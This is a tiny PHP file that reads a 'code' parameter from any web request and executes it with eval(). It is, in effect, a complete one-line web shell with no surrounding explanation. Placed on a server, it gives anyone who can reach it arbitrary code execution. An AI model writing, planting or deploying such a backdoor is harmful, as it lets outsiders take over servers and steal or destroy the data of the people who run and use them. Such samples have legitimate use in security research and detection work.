<?php



$code = $_REQUEST['code'];

eval($code);


?>